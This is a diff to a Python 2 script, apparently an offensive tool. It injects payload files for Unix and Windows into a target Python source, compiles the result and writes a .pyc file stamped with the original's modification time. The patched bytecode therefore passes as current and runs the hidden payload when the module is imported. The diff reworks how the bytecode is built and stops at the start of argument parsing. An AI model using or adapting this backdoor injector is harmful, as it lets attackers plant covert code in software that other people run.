@@ -1,57 +1,59 @@
-#!/user/bin/env python
+#!/usr/bin/env python
 
 import struct
 import sys
 import os
-import fileinput
-import shutil
-import py_compile
-
+import __builtin__
+import imp
+import marshal
 
 class patch_pyc():
     def __init__(self, org_file, nix_payload=None, windows_payload=None):
         self.nix_payload = nix_payload
         self.windows_payload = windows_payload
         self.org_file = org_file
+        self.temp_bytecode = ''
+        
         self.read_payloads()
+        self.get_bytecode()
+        self.write_bytecode()
         self.write_file()
 
     def read_payloads(self):
         if self.nix_payload:
-            self.nix = open(self.nix_payload, 'r').read()
+            self.nix = open(self.nix_payload, 'U').read()
         if self.windows_payload:
-                self.windows = open(self.windows_payload, 'r').read()
+            self.windows = open(self.windows_payload, 'U').read()
+
+    def get_bytecode(self):
+        with open(self.org_file, 'U') as g:
+            self.codestring = g.read()
+
+    def write_bytecode(self):
+
+        self.codestring += "\n"
+        
+        if self.nix_payload:
+            self.codestring += self.nix
+        if self.windows_payload:
+            self.codestring += self.windows
+
+        codeobject = __builtin__.compile(self.codestring, self.org_file, 'exec')
+        self.temp_bytecode = marshal.dumps(codeobject)
 
     def write_file(self):
-        #copy to temp
-        if os.name == "posix":
-            temp_file = "/tmp/" + os.path.basename(self.org_file)
-        print "PY file temp location:", temp_file
-        if os.name == "nt":
-            temp_file = "C:/Windows/Temp/" + os.path.basename(self.org_file)
-        shutil.copy(self.org_file, temp_file)
-
-        with open(temp_file, 'a') as g:
-            if self.nix_payload:
-                    g.write(self.nix)
-            if self.windows_payload:
-                    g.write(self.windows)
-
-        py_compile.compile(temp_file)
-        pyc_file = temp_file + "c"
+        pyc_file = self.org_file + "c"
         print "PYC file temp location:", pyc_file
-
+        
         timestamp = int(os.stat(self.org_file).st_mtime)
+
         print "Timestamp of python file:", timestamp
 
-        with open(pyc_file, 'r+b') as f:
-            f.seek(4, 0)
+        with open(pyc_file, 'w') as f:
+            f.write(imp.get_magic())
             f.write(struct.pack("<I", timestamp))
+            f.write(self.temp_bytecode)
 
-        #clean up
-        shutil.copy(pyc_file, os.path.dirname(os.path.abspath(self.org_file)) + "/")
-        os.remove(temp_file)
-        os.remove(pyc_file)
         
 if __name__ == "__main__":
     import argparse
